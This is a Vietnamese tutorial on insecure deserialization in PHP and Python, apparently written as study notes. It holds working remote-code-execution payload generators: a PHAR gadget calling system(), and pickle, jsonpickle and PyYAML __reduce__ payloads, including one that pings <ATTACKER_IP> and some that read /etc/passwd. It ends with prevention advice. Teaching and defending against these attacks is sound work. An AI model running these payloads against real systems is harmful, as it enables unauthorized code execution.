# Tổng quan về Deserialization Attacks

**Serialize** là quá trình chuyển đổi một object hoặc cấu trúc dữ liệu trong memory thành một chuỗi bytes để nó có thể được lưu trữ và truyền đi trên network.

**Deserialize** là quá trình ngược lại của serialize. Nó chuyển đổi một chuỗi serialized thành object hoặc cấu trúc dữ liệu trong memory.

Nếu user-input được sử dụng để deserialize, attacker có thể thao túng serialized data để thực hiện những hành vi trái phép (sửa thuộc tính, tận dụng các magic method tạo thành gadget chain, ...). Impact của nó tùy thuộc vào ứng dụng web cụ thể, và thường rất có thể dẫn đến RCE.

Để nhận dạng lỗ hổng này ta có thể dựa vào:

**White-Box**

```
unserialize() - PHP
pickle.loads() - Python Pickle
jsonpickle.decode() - Python JSONPickle
yaml.load() - Python PyYAML
readObject() - Java
Deserialize() - C#/.NET
Marshal.load() - Ruby
```

**Black-Box**

```
# Ta có thể sử dụng Freddy extension của Burp hoặc dựa vào các dấu hiệu bên dưới

a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1: {i:0;i:4;}i:3;s:7:"ACADEMY";} - PHP

(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na. - Pickle Protocol 0, default for Python 2.x

Bytes starting with 80 01 (Hex) and ending with . - Pickle Protocol 1, Python 2.x

Bytes starting with 80 02 (Hex) and ending with . - Pickle Protocol 2, Python 2.3+

Bytes starting with 80 03 (Hex) and ending with . - Pickle Protocol 3, default for Python 3.0-3.7

Bytes starting with 80 04 95 (Hex) and ending with . - Pickle Protocol 4, default for Python 3.8+

Bytes starting with 80 05 95 (Hex) and ending with . - Pickle Protocol 5, Python 3.x

["Test", "Data", [4], "ACADEMY"] - JSONPickle, Python 2.7 / 3.6+

- Test\n- Data\n- - 4\n- ACADEMY\n - PyYAML / ruamel.yaml, Python 3.6+

Bytes starting with AC ED 00 05 73 72 (Hex) or rO0ABXNy (Base64) - Java

Bytes starting with 00 01 00 00 00 ff ff ff ff (Hex) or AAEAAAD///// (Base64) - C# / .NET

Bytes starting with 04 08 (Hex) - Ruby
```

# Deserialization trong PHP

Bản chất của việc khai thác Deserialization là việc chỉnh sửa giá trị của 1 thuộc tính trong object khiến nó thực hiện trái ý muốn ban đầu, và PHP cũng vậy. 

Ví dụ: một serialized object có chứa trường `isAdmin` như bên dưới:

```
O:4:"User":2:{s:8:"username";s:5:"alice";s:7:"isAdmin";b:0;}
```

Khi attacker có thể kiểm soát serialized data này, attacker có thể sửa giá trị isAdmin thành true để có quyền Admin:

```
O:4:"User":2:{s:8:"username";s:5:"alice";s:7:"isAdmin";b:1;}
```

Tùy thuộc vào logic của ứng dụng khi mà thay đổi giá trị của thuộc tính có thể dẫn đến những impact khác nhau. Chẳng hạn giá trị của thuộc tính này sau đó được đưa vào SQL dẫn đến SQLi. Hay được đưa vào sink system dẫn đến CMDi.

Ngoài ra, ta có thể dựa vào các magic method để tạo nên một gadget chain.

## Magic Method

Magic Method là các method đặc biệt ghi đè lên hành động mặc định của PHP khi được gọi trên một đối tượng.

| Method | Description | Example |
|---|---|---|
| `__construct` | Define a constructor for a class. Called when a new instance is created. | `new Class()` |
| `__toString` | Define how an object reacts when treated as a string. | `echo $obj` |
| `__call` | Called when you try to call inaccessible methods in an object context. | `$obj->doesntExist()` |
| `__get` | Called when you try to read inaccessible properties. | `$obj->doesntExist` |
| `__set` | Called when you try to write inaccessible properties. | `$obj->doesntExist = 1` |
| `__clone` | Called when you try to clone an object. | `$copy = clone $object` |
| `__destruct` | Called when an object is destroyed (opposite of constructor). | - |
| `__isset` | Called when you try to call `isset()` or `empty()` on inaccessible properties. | `isset($obj->doesntExist)` |
| `__invoke` | Called when you try to invoke an object as a function. | `$obj()` |
| `__sleep` | Called when serializing an object. If `__serialize` and `__sleep` are both defined, `__serialize` takes precedence. | `serialize($obj)` |
| `__wakeup` | Called when deserializing an object. If `__unserialize` and `__wakeup` are both defined, `__unserialize` takes precedence. | `unserialize($ser_obj)` |
| `__unset` | Called when you try to unset inaccessible properties. | `unset($obj->doesntExist)` |
| `__callStatic` | Called when you try to call inaccessible methods in a static context. | `Class::doesntExist()` |
| `__set_state` | Called when `var_export()` is called on an object. | `var_export($obj, true)` |
| `__debugInfo` | Called when `var_dump()` is called on an object. | `var_dump($obj)` |
| `__unserialize` | Called when deserializing an object. If both `__unserialize` and `__wakeup` are defined, `__unserialize` is used. Available since PHP 7.4. | `unserialize($obj)` |
| `__serialize` | Called when serializing an object. If both `__serialize` and `__sleep` are defined, `__serialize` is used. Available since PHP 7.4. | `serialize($obj)` |

## Upload progress session serializer mismatch (CVE-2026-115560)

https://hacktricks.wiki/en/pentesting-web/deserialization/index.html#upload-progress-session-serializer-mismatch

## Phar Deserialization

PHAR (PHP Archive) là một định dạng archive được PHP hỗ trợ, cho phép đóng gói nhiều file và thư mục thành một archive duy nhất. Nó có thể được sử dụng để phân phối các ứng dụng, thư viện PHP hoặc lưu trữ các tài nguyên khác, tương tự như JAR file cho Java. Có thể truy cập file bên trong archive này bằng wrapper `phar://` : `phar://path/to/myphar.phar/file.php`

Trong thằng PHAR archive này có 1 property là metadata. Metadata có thể là bất cứ PHP varible nào mà có thể được serialized. Tất cả các phiên bản cho đến version `8.0`, metedata này sẽ tự động được deserialize khi mà parsing a PHAR file (bất cứ khi nào mà file được gọi với wrapper `phar://`). Ngay cả khi call nó với các function như:

```php
file_exists()
file_get_contents()
filesize()
fopen()
file()
md5_file()
filetime()
```

Với PHP >= 8.0: metedata sẽ chỉ được deserialize cho đến khi server gọi tới `Phar:getMetadata()`

Để tạo file phar:

```php
<?php

class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}

// Create a new PHAR.
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// Store the gadget object as metadata.
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

Creat with command:

```bash
php --define phar.readonly=0 create_phar.php
```

## Tools: PHPGGC

Công cụ này chứa collection of gadget chains, tồn tại sẵn trong các library, framework của PHP. Thay vì phải tự đi tìm gadget ta có thể thử sử dụng công cụ này xem đã tồn tại những gadget có sẵn chưa. Ngoài ra nó cũng hỗ trợ tạo gadget cho PHAR deserialization.

Installation:

```bash
git clone https://github.com/ambionics/phpggc.git
```

# Desrialization trong Python

Trong python ta có sẵn một built-in gadget đó là `__reduce__`. Đây là một magic method được sử dụng trong quá trình serialization để xác định cách một object được tái tạo khi deserialize.

Method này trả về hai thành phần chính:

- **Callable:** Một đối tượng có thể gọi được (function, class hoặc callable object), được sử dụng để khởi tạo hoặc tái tạo object.
- **Arguments:** Một tuple chứa các đối số được truyền vào callable đó.

Cơ chế hoạt động:

1. **Serialization (`pickle.dumps()`):** Pickle gọi `__reduce__()` để lấy callable và arguments, sau đó lưu thông tin này vào serialized data.
2. **Deserialization (`pickle.loads()`):** Pickle đọc serialized data, gọi callable với các arguments tương ứng để tái tạo object.

Attacker có thể lợi dụng cơ chế này bằng cách kiểm soát callable và arguments trong serialized data, khiến Python thực thi các hàm ngoài ý muốn trong quá trình deserialize. Ví dụ, sử dụng `os.system()` để thực thi system command, từ đó có thể dẫn đến Remote Code Execution (RCE).

ví dụ trong `pickle`:

```python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 <ATTACKER_IP>",)
        
r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
```

Tương tự như vậy với `JSONPickle`:

```python3
import jsonpickle
import os

class RCE():
    def __reduce__(self):
        return os.system, ("head /etc/passwd",)

# Serialize (generate payload)
exploit = jsonpickle.encode(RCE())
print(exploit)

# Deserialize (vulnerable code)
jsonpickle.decode(exploit)
```

Với `YAML`:

```python3 
import yaml
import subprocess

class RCE():
    def __reduce__(self):
        return subprocess.Popen, (["head", "/etc/passwd"],)
        
# Serialize (Create the payload)
exploit = yaml.dump(RCE())
print(exploit)

# Deserialize using an unsafe loader
yaml.load(exploit, Loader=yaml.UnsafeLoader)
```

## Tools: PEAS

Công cụ này giúp tự động tạo Python deserialization payloads cho `Pickle`, `JSONPickle`, `PyYAML` and `ruamel.yaml`.  

Installation

```bash
git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator.git
```

# Prevent

* Không nên deserialize dữ liệu do người dùng kiểm soát

* Giới hạn các class được phép Deserialize:

```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
    'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
    'allowed_classes' => [MyModel::class, DateTime::class]
]);
```

* **Sử dụng Safe Data Formats**: trong các trường hợp đơn giản, ta có thể chuyển sang JSON hay XML để lưu dữ liệu thay vì sử dụng serialized data

* **Sử dụng HMACs**: là một cơ chế bảo đảm tính xác thực và toàn vẹn của dữ liệu dựa trên sự kết hợp giữa 1 hàm băm mật mã như (SHA-256, MD5) và một khóa bí mật (Secret Key). Cơ chế chống lại deserialization sử dụng HMAC đó là: sau khi tạo serialized data, server sẽ sử dụng HMAC để tính toán ra 1 giá trị băm, sau đó gửi về cho client serialized data kèm theo giá trị băm này thay vì chỉ gửi serialized data như thông thường. Ở quá trình deserialize, client lúc này phải gửi cả serialized data và HMAC value, server sẽ lấy serialized data mà client gửi lên, tính toán lại và so khớp xem có trùng với HMAC value được gửi kèm không, nếu khớp mới thực hiện deserialized và ngược lại sẽ từ chối. Nhờ cơ chế này, nếu user chỉ cần sửa 1 trong 2 giá trị serialzed data hoặc HMAC value thì đều sẽ bị từ chối.

Examle code:

```python
...
import hmac
import hashlib

...

def sessionToCookie(session):
    # Create a pickled object and then calculate an HMAC using our secret key
    pickled = pickle.dumps(session)
    hmac_calculated = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
    # Concat the two parts together (base64-encoded) and use it as our cookie
    cookie = base64.b64encode(pickled) + b'.' + base64.b64encode(hmac_calculated)
    return cookie

def cookieToSession(cookie):
    # Split and decode the cookie into Pickle and HMAC
    pickled_b64, hmac_given_b64 = cookie.split(".")
    pickled = base64.b64decode(pickled_b64)
    hmac_given = base64.b64decode(hmac_given_b64)
    # Calculate the expected HMAC value and check if it matches
    hmac_expected = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
    if not hmac.compare_digest(hmac_expected, hmac_given):
        return None
    # We have verified that this server created the cookie, and
    # can now unpickle the object safely
    unpickled = pickle.loads(pickled)
    return unpickled
...
```
